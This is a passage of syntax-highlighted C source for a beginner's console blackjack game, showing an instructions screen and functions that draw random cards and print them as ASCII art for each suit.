punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c If your total goes over 21, you will LOSE!."</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     But the world is not over, because you can always play again.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWould you like to go the previous screen? (I will not take NO for an answer)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                  (Y/N)\n                    "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue. Prints menu.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End if loop</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, convinces user to enter yes</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                 I told you so.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Club Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span>           <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Diamond Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Heart Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Spade Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token 